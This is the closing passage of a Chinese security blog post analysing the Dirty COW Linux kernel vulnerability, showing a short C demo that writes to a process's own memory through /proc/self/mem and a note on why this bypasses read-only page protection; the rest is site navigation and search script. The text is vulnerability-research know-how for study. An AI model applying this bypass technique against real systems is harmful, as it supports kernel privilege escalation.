<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">int</span> evil = <span class="number">999</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, (<span class="keyword">off_t</span>)&amp;value, SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, &amp;evil, <span class="keyword">sizeof</span>(evil)) != <span class="keyword">sizeof</span>(evil)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	close(fd);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value = %d\n&quot;</span>, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="é—®é¢˜è®¨è®º"   >
          <a href="#é—®é¢˜è®¨è®º" class="heading-link"><i class="fas fa-link"></i></a><a href="#é—®é¢˜è®¨è®º" class="headerlink" title="é—®é¢˜è®¨è®º"></a>é—®é¢˜è®¨è®º</h2>
      <ul>
<li><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥å¯¹mmapçš„é¡µç”¨writeå†™ï¼Œè€Œæ˜¯ä½¿ç”¨/proc/self/memï¼Ÿ</p>
<p>æˆ‘çš„ç†è§£ï¼šå› ä¸ºå¯¹<code>/proc/self/mem</code>å†™å…¥æ—¶ï¼Œå†…æ ¸ç©ºé—´å¤„ç†æœ‰è°ƒç”¨kmapå‡½æ•°ï¼Œæ˜ å°„ç›®æ ‡ç‰©ç†é¡µé¢åˆ°å†…æ ¸ï¼ˆpteæ˜¯å¯å†™çš„ï¼‰ï¼Œå¯¹ç›®æ ‡é¡µé¢è¯»å†™ã€‚æ‰€ä»¥åŸæœ¬ç”¨æˆ·ä¸å¯å†™çš„å†…å­˜åŒºåŸŸï¼ˆpteæ˜¯åªè¯»çš„ï¼‰ï¼Œä¹Ÿå¯å†™å…¥ã€‚è€Œwriteæˆ–memcpyå‡½æ•°å¯¹åº”çš„å†…æ ¸å¤„ç†æµç¨‹ä¸­ï¼Œå¦‚æœå‘ç°å¾€åªè¯»å†…å­˜å†™ï¼Œå°±ä¼šäº§ç”Ÿsegmentation faultã€‚</p>
</li>
</ul>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ æœ¬æ–‡ç»“æŸï¼Œæ„Ÿè°¢æ‚¨çš„é˜…è¯» ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">æœ¬æ–‡ä½œè€…: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">æœ¬æ–‡é“¾æ¥: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/">http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">ç‰ˆæƒå£°æ˜: </span><span class="copyright-notice__value">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</span></div></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/05/02/230501-dirtycow-to-root/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">åŸºäºdirtycowçš„å‡ ç§ææƒæ€è·¯</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/04/01/230401-n1ctf2022-pwn-praymoon/"><span class="paginator-prev__text">N1CTF2022 praymoon</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">æ–‡ç« ç›®å½•</span><span class="sidebar-nav-ov">ç«™ç‚¹æ¦‚è§ˆ</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dirtycow%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
          dirtycowæ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">
          expåˆ†æ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">
          è°ƒç”¨é“¾åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1"><span class="toc-number">3.1.</span> <span class="toc-text">
          ç¬¬ä¸€æ¬¡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1"><span class="toc-number">3.2.</span> <span class="toc-text">
          ç¬¬äºŒæ¬¡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1"><span class="toc-number">3.3.</span> <span class="toc-text">
          ç¬¬ä¸‰æ¬¡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AC%A1"><span class="toc-number">3.4.</span> <span class="toc-text">
          ç¬¬å››æ¬¡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88"><span class="toc-number">3.5.</span> <span class="toc-text">
          æœ€ç»ˆ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.6.</span> <span class="toc-text">
          æ€»ç»“</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">4.</span> <span class="toc-text">
          å¤ç°ç¯å¢ƒ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">5.</span> <span class="toc-text">
          æ¼æ´ä¿®å¤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">6.</span> <span class="toc-text">
          å‚è€ƒèµ„æ–™</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">7.</span> <span class="toc-text">
          çŸ¥è¯†ç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#copy-on-write%E6%9C%BA%E5%88%B6"><span class="toc-number">7.1.</span> <span class="toc-text">
          copy-on-writeæœºåˆ¶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap"><span class="toc-number">7.2.</span> <span class="toc-text">
          mmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#madvise"><span class="toc-number">7.3.</span> <span class="toc-text">
          madvise</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proc-self-mem%E6%96%87%E4%BB%B6"><span class="toc-number">7.4.</span> <span class="toc-text">
          &#x2F;proc&#x2F;self&#x2F;memæ–‡ä»¶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E8%AE%A8%E8%AE%BA"><span class="toc-number">7.5.</span> <span class="toc-text">
          é—®é¢˜è®¨è®º</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">66</div><div class="sidebar-ov-state-item__name">å½’æ¡£</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">åˆ†ç±»</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">37</div><div class="sidebar-ov-state-item__name">æ ‡ç­¾</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="çŸ¥è¯†å…±äº«è®¸å¯åè®®" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">ä½ å·²é˜…è¯»äº† </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>ç”± <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> å¼ºåŠ›é©±åŠ¨</span><span> v5.3.0</span><span class="footer__devider">|</span><span>ä¸»é¢˜ - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="è®¿é—®äººæ•°"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="æµè§ˆæ€»é‡"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="æœç´¢æ–‡ç« ï¼ˆæ”¯æŒå¤šå…³é”®è¯ï¼Œè¯·ç”¨ç©ºæ ¼åˆ†éš”ï¼‰"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ æ–‡ç« æ— æ ‡é¢˜ ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'è¯·è¾“å…¥å­—ç¬¦');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>